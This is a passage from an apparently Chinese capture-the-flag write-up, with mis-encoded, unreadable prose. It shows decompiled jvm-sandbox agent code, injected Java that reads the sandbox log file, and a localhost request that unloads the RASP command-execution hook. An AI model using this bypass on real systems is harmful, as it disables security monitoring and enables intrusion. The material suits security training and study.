<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;agent.jar&quot;</span>, <span class="hljs-string">&quot;ab+&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        f.write(base64.b64decode(i))<br></code></pre></td></tr></table></figure><p>åç¼–è¯‘åçš„æºç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//  </span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA  </span><br><span class="hljs-comment">// (powered by FernFlower decompiler)  </span><br><span class="hljs-comment">//  </span><br><br><span class="hljs-keyword">package</span> com.alibaba.jvm.sandbox.agent;  <br><br><span class="hljs-keyword">import</span> java.io.File;  <br><span class="hljs-keyword">import</span> java.io.FileWriter;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;  <br><span class="hljs-keyword">import</span> java.net.InetSocketAddress;  <br><span class="hljs-keyword">import</span> java.util.LinkedHashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br><span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;  <br><span class="hljs-keyword">import</span> java.util.jar.JarFile;  <br><span class="hljs-keyword">import</span> java.util.regex.Matcher;  <br><span class="hljs-keyword">import</span> java.util.regex.Pattern;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentLauncher</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_SANDBOX_HOME</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(AgentLauncher.class.getProtectionDomain().getCodeSource().getLocation().getFile())).getParentFile().getParent();  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String SANDBOX_USER_MODULE_PATH;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LAUNCH_MODE_AGENT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;agent&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LAUNCH_MODE_ATTACH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;attach&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String LAUNCH_MODE;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String RESULT_FILE_PATH;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Map&lt;String, SandboxClassLoader&gt; sandboxClassLoaderMap;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CLASS_OF_CORE_CONFIGURE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.CoreConfigure&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CLASS_OF_PROXY_CORE_SERVER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.server.ProxyCoreServer&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EMPTY_STRING</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_SANDBOX_HOME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;home&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_NAMESPACE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;namespace&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESPACE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;default&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_SERVER_IP</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;server.ip&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_IP</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;0.0.0.0&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_SERVER_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;server.port&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;0&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_TOKEN</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;token&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_TOKEN</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_PROPERTIES_FILE_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;prop&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String OS;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AgentLauncher</span><span class="hljs-params">()</span> &#123;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxCfgPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;cfg&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxModulePath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;module&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxCoreJarPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;lib&quot;</span> + File.separator + <span class="hljs-string">&quot;sandbox-core.jar&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxSpyJarPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;lib&quot;</span> + File.separator + <span class="hljs-string">&quot;sandbox-spy.jar&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxPropertiesPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">var10000</span> <span class="hljs-operator">=</span> getSandboxCfgPath(sandboxHome);  <br>        <span class="hljs-keyword">return</span> var10000 + File.separator + <span class="hljs-string">&quot;sandbox.properties&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxProviderPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;provider&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String featureString, Instrumentation inst)</span> &#123;  <br>        LAUNCH_MODE = <span class="hljs-string">&quot;agent&quot;</span>;  <br>        install(toFeatureMap(featureString), inst);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String featureString, Instrumentation inst)</span> &#123;  <br>        LAUNCH_MODE = <span class="hljs-string">&quot;attach&quot;</span>;  <br>        Map&lt;String, String&gt; featureMap = toFeatureMap(featureString);  <br>        writeAttachResult(getNamespace(featureMap), getToken(featureMap), install(featureMap, inst));  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeAttachResult</span><span class="hljs-params">(String namespace, String token, InetSocketAddress local)</span> &#123;  <br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(RESULT_FILE_PATH);  <br>        <span class="hljs-keyword">if</span> (!file.exists() || file.isFile() &amp;&amp; file.canWrite()) &#123;  <br>            <span class="hljs-keyword">try</span> &#123;  <br>                <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(file, <span class="hljs-literal">true</span>);  <br><br>                <span class="hljs-keyword">try</span> &#123;  <br>                    fw.append(String.format(<span class="hljs-string">&quot;%s;%s;%s;%s\n&quot;</span>, namespace, token, local.getHostName(), local.getPort()));  <br>                    fw.flush();  <br>                &#125; <span class="hljs-keyword">catch</span> (Throwable var8) &#123;  <br>                    <span class="hljs-keyword">try</span> &#123;  <br>                        fw.close();  <br>                    &#125; <span class="hljs-keyword">catch</span> (Throwable var7) &#123;  <br>                        var8.addSuppressed(var7);  <br>                    &#125;  <br><br>                    <span class="hljs-keyword">throw</span> var8;  <br>                &#125;  <br><br>                fw.close();  <br>            &#125; <span class="hljs-keyword">catch</span> (IOException var9) &#123;  <br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(var9);  <br>            &#125;  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;write to result file : &quot;</span> + file + <span class="hljs-string">&quot; failed.&quot;</span>);  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> ClassLoader <span class="hljs-title function_">loadOrDefineClassLoader</span><span class="hljs-params">(String namespace, String coreJar)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        SandboxClassLoader classLoader;  <br>        <span class="hljs-keyword">if</span> (sandboxClassLoaderMap.containsKey(namespace) &amp;&amp; <span class="hljs-literal">null</span> != sandboxClassLoaderMap.get(namespace)) &#123;  <br>            classLoader = (SandboxClassLoader)sandboxClassLoaderMap.get(namespace);  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            classLoader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SandboxClassLoader</span>(namespace, coreJar);  <br>            sandboxClassLoaderMap.put(namespace, classLoader);  <br>        &#125;  <br><br>        <span class="hljs-keyword">return</span> classLoader;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uninstall</span><span class="hljs-params">(String namespace)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        <span class="hljs-type">SandboxClassLoader</span> <span class="hljs-variable">sandboxClassLoader</span> <span class="hljs-operator">=</span> (SandboxClassLoader)sandboxClassLoaderMap.get(namespace);  <br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != sandboxClassLoader) &#123;  <br>            Class&lt;?&gt; classOfProxyServer = sandboxClassLoader.loadClass(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.server.ProxyCoreServer&quot;</span>);  <br>            classOfProxyServer.getMethod(<span class="hljs-string">&quot;destroy&quot;</span>).invoke(classOfProxyServer.getMethod(<span class="hljs-string">&quot;getInstance&quot;</span>).invoke((Object)<span class="hljs-literal">null</span>));  <br>            sandboxClassLoader.closeIfPossible();  <br>            sandboxClassLoaderMap.remove(namespace);  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> InetSocketAddress <span class="hljs-title function_">install</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap, Instrumentation inst)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">namespace</span> <span class="hljs-operator">=</span> getNamespace(featureMap);  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">propertiesFilePath</span> <span class="hljs-operator">=</span> getPropertiesFilePath(featureMap);  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">coreFeatureString</span> <span class="hljs-operator">=</span> toFeatureString(featureMap);  <br><br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-type">String</span> <span class="hljs-variable">home</span> <span class="hljs-operator">=</span> getSandboxHome(featureMap);  <br>            inst.appendToBootstrapClassLoaderSearch(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JarFile</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(getSandboxSpyJarPath(home))));  <br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">sandboxClassLoader</span> <span class="hljs-operator">=</span> loadOrDefineClassLoader(namespace, getSandboxCoreJarPath(home));  <br>            Class&lt;?&gt; classOfConfigure = sandboxClassLoader.loadClass(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.CoreConfigure&quot;</span>);  <br>            <span class="hljs-type">Object</span> <span class="hljs-variable">objectOfCoreConfigure</span> <span class="hljs-operator">=</span> classOfConfigure.getMethod(<span class="hljs-string">&quot;toConfigure&quot;</span>, String.class, String.class).invoke((Object)<span class="hljs-literal">null</span>, coreFeatureString, propertiesFilePath);  <br>            Class&lt;?&gt; classOfProxyServer = sandboxClassLoader.loadClass(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.server.ProxyCoreServer&quot;</span>);  <br>            <span class="hljs-type">Object</span> <span class="hljs-variable">objectOfProxyServer</span> <span class="hljs-operator">=</span> classOfProxyServer.getMethod(<span class="hljs-string">&quot;getInstance&quot;</span>).invoke((Object)<span class="hljs-literal">null</span>);  <br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isBind</span> <span class="hljs-operator">=</span> (Boolean)classOfProxyServer.getMethod(<span class="hljs-string">&quot;isBind&quot;</span>).invoke(objectOfProxyServer);  <br>            <span class="hljs-keyword">if</span> (!isBind) &#123;  <br>                <span class="hljs-keyword">try</span> &#123;  <br>                    classOfProxyServer.getMethod(<span class="hljs-string">&quot;bind&quot;</span>, classOfConfigure, Instrumentation.class).invoke(objectOfProxyServer, objectOfCoreConfigure, inst);  <br>                &#125; <span class="hljs-keyword">catch</span> (Throwable var13) &#123;  <br>                    classOfProxyServer.getMethod(<span class="hljs-string">&quot;destroy&quot;</span>).invoke(objectOfProxyServer);  <br>                    <span class="hljs-keyword">throw</span> var13;  <br>                &#125;  <br>            &#125;  <br><br>            <span class="hljs-keyword">return</span> (InetSocketAddress)classOfProxyServer.getMethod(<span class="hljs-string">&quot;getLocal&quot;</span>).invoke(objectOfProxyServer);  <br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var14) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;sandbox attach failed.&quot;</span>, var14);  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isNotBlankString</span><span class="hljs-params">(String string)</span> &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span> != string &amp;&amp; string.length() &gt; <span class="hljs-number">0</span> &amp;&amp; !string.matches(<span class="hljs-string">&quot;^\\s*$&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isBlankString</span><span class="hljs-params">(String string)</span> &#123;  <br>        <span class="hljs-keyword">return</span> !isNotBlankString(string);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getDefaultString</span><span class="hljs-params">(String string, String defaultString)</span> &#123;  <br>        <span class="hljs-keyword">return</span> isNotBlankString(string) ? string : defaultString;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;String, String&gt; <span class="hljs-title function_">toFeatureMap</span><span class="hljs-params">(String featureString)</span> &#123;  <br>        Map&lt;String, String&gt; featureMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>();  <br>        <span class="hljs-keyword">if</span> (isBlankString(featureString)) &#123;  <br>            <span class="hljs-keyword">return</span> featureMap;  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            String[] kvPairSegmentArray = featureString.split(<span class="hljs-string">&quot;;&quot;</span>);  <br>            <span class="hljs-keyword">if</span> (kvPairSegmentArray.length == <span class="hljs-number">0</span>) &#123;  <br>                <span class="hljs-keyword">return</span> featureMap;  <br>            &#125; <span class="hljs-keyword">else</span> &#123;  <br>                String[] var3 = kvPairSegmentArray;  <br>                <span class="hljs-type">int</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> kvPairSegmentArray.length;  <br><br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var5 &lt; var4; ++var5) &#123;  <br>                    <span class="hljs-type">String</span> <span class="hljs-variable">kvPairSegmentString</span> <span class="hljs-operator">=</span> var3[var5];  <br>                    <span class="hljs-keyword">if</span> (!isBlankString(kvPairSegmentString)) &#123;  <br>                        String[] kvSegmentArray = kvPairSegmentString.split(<span class="hljs-string">&quot;=&quot;</span>);  <br>                        <span class="hljs-keyword">if</span> (kvSegmentArray.length == <span class="hljs-number">2</span> &amp;&amp; !isBlankString(kvSegmentArray[<span class="hljs-number">0</span>]) &amp;&amp; !isBlankString(kvSegmentArray[<span class="hljs-number">1</span>])) &#123;  <br>                            featureMap.put(kvSegmentArray[<span class="hljs-number">0</span>], kvSegmentArray[<span class="hljs-number">1</span>]);  <br>                        &#125;  <br>                    &#125;  <br>                &#125;  <br><br>                <span class="hljs-keyword">return</span> featureMap;  <br>            &#125;  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getDefault</span><span class="hljs-params">(Map&lt;String, String&gt; map, String key, String defaultValue)</span> &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span> != map &amp;&amp; !map.isEmpty() ? getDefaultString((String)map.get(key), defaultValue) : defaultValue;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isWindows</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> OS.contains(<span class="hljs-string">&quot;win&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxHome</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">home</span> <span class="hljs-operator">=</span> getDefault(featureMap, <span class="hljs-string">&quot;home&quot;</span>, DEFAULT_SANDBOX_HOME);  <br>        <span class="hljs-keyword">if</span> (isWindows()) &#123;  <br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;(?i)^[/\\\\]([a-z])[/\\\\]&quot;</span>).matcher(home);  <br>            <span class="hljs-keyword">if</span> (m.find()) &#123;  <br>                home = m.replaceFirst(<span class="hljs-string">&quot;$1:/&quot;</span>);  <br>            &#125;  <br>        &#125;  <br><br>        <span class="hljs-keyword">return</span> home;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getNamespace</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-keyword">return</span> getDefault(featureMap, <span class="hljs-string">&quot;namespace&quot;</span>, <span class="hljs-string">&quot;default&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getToken</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-keyword">return</span> getDefault(featureMap, <span class="hljs-string">&quot;token&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getPropertiesFilePath</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-keyword">return</span> getDefault(featureMap, <span class="hljs-string">&quot;prop&quot;</span>, getSandboxPropertiesPath(getSandboxHome(featureMap)));  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">appendFromFeatureMap</span><span class="hljs-params">(StringBuilder featureSB, Map&lt;String, String&gt; featureMap, String key, String defaultValue)</span> &#123;  <br>        <span class="hljs-keyword">if</span> (featureMap.containsKey(key)) &#123;  <br>            featureSB.append(String.format(<span class="hljs-string">&quot;%s=%s;&quot;</span>, key, getDefault(featureMap, key, defaultValue)));  <br>        &#125;  <br><br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">toFeatureString</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">sandboxHome</span> <span class="hljs-operator">=</span> getSandboxHome(featureMap);  <br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">featureSB</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(String.format(<span class="hljs-string">&quot;;cfg=%s;system_module=%s;mode=%s;sandbox_home=%s;user_module=%s;provider=%s;namespace=%s;&quot;</span>, getSandboxCfgPath(sandboxHome), getSandboxModulePath(sandboxHome), LAUNCH_MODE, sandboxHome, SANDBOX_USER_MODULE_PATH, getSandboxProviderPath(sandboxHome), getNamespace(featureMap)));  <br>        appendFromFeatureMap(featureSB, featureMap, <span class="hljs-string">&quot;server.ip&quot;</span>, <span class="hljs-string">&quot;0.0.0.0&quot;</span>);  <br>        appendFromFeatureMap(featureSB, featureMap, <span class="hljs-string">&quot;server.port&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>);  <br>        <span class="hljs-keyword">return</span> featureSB.toString();  <br>    &#125;  <br><br>    <span class="hljs-keyword">static</span> &#123;  <br>        SANDBOX_USER_MODULE_PATH = DEFAULT_SANDBOX_HOME + File.separator + <span class="hljs-string">&quot;sandbox-module&quot;</span>;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">var10000</span> <span class="hljs-operator">=</span> System.getProperties().getProperty(<span class="hljs-string">&quot;user.home&quot;</span>);  <br>        RESULT_FILE_PATH = var10000 + File.separator + <span class="hljs-string">&quot;.sandbox.token&quot;</span>;  <br>        sandboxClassLoaderMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>();  <br>        OS = System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ²™ç®±æ˜¯é˜¿é‡Œäº‘çš„ä¸€ä¸ªsandboxé¡¹ç›®ï¼Œé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/alibaba/jvm-sandbox">https://github.com/alibaba/jvm-sandbox</a></p><p>å…¶ä¸­ä»–æ˜¯æœ‰ä¸€ä¸ªå¸è½½æ²™ç®±çš„æ“ä½œçš„ï¼Œè¿™æ˜¯å®˜æ–¹ç»™å‡ºçš„å¸è½½å‘½ä»¤</p><figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">./sandbox.sh -p 33342 -S<br>jvm-sandbox[default] shutdown finished.<br></code></pre></td></tr></table></figure><p>è¿™é¢˜çœ‹äº†å„ä¸ªæ–‡ç« ï¼Œä»–ä»¬çš„åšæ³•ä¹Ÿéƒ½æ˜¯ç›´æ¥å¸è½½raspæ²™ç®±æ¥å®ç°ç»•è¿‡ï¼Œæœ‰æ®µæ›´è¯¦ç»†çš„å¸è½½æ“ä½œåœ¨ä»–çš„.shè„šæœ¬æ–‡ä»¶é‡Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†ä»–çš„è„šæœ¬ç²˜è´´è¿‡å»é—®ä¸€ä¸‹gptå®ƒæ˜¯å¦‚ä½•å¸è½½çš„</p><p><img src="https://cdn.clown2024.cn/image-20241111220208835.png" alt="image-20241111220208835"></p><p>è¿™é‡Œæœ‰ä¸ª-uå¯ä»¥å¸è½½æŒ‡å®šæ¨¡å—</p><p>å®ƒé‡Œé¢çš„å…·ä½“æ“ä½œæ˜¯è°ƒç”¨ä¸€ä¸ª<code>sandbox_curl_with_exit</code>å‡½æ•°å‘èµ·è¯·æ±‚åˆ°æ²™ç®±æœåŠ¡å™¨æ¥æ‰§è¡Œå¸è½½æ¨¡å—çš„æ“ä½œï¼Œå®˜æ–¹è„šæœ¬ç¤ºä¾‹å¦‚ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241111222729536.png" alt="image-20241111222729536"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç›´æ¥è¯·æ±‚å¯¹åº”çš„urlæ¥è¿›è¡Œæ¨¡å—çš„å¸è½½ï¼Œé‚£ä¹ˆraspç›‘å¬çš„æ˜¯å“ªä¸ªç«¯å£å‘¢ï¼Œè¿™ä¸ªæˆ‘ä»¬å»çœ‹raspçš„logå°±èƒ½çŸ¥é“äº†</p><p>æŸ¥çœ‹æ—¥å¿—</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>            java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL(<span class="hljs-string">&quot;file:///home/ctf/logs/sandbox/sandbox.log&quot;</span>);<br>            java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> url.openStream();<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>            bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[inputStream.available()];<br>            inputStream.read(bytes);<br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes));<br>            System.out.println(java.util.Base64.getEncoder().encodeToString(bytes));<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            System.out.println(<span class="hljs-string">&quot;error&quot;</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å†™ä¸€ä¸ªè¯·æ±‚ä»£ç å»è¯·æ±‚æœ¬åœ°çš„raspæ¥å£ç„¶åå¸è½½æ¨¡å—ï¼š<a href="http://127.0.0.1:port/sandbox/default/module/http/sandbox-module-mgr/unload?action=unload&ids=rasp-rce-native-hook">http://127.0.0.1:port/sandbox/default/module/http/sandbox-module-mgr/unload?action=unload&amp;ids=rasp-rce-native-hook</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>     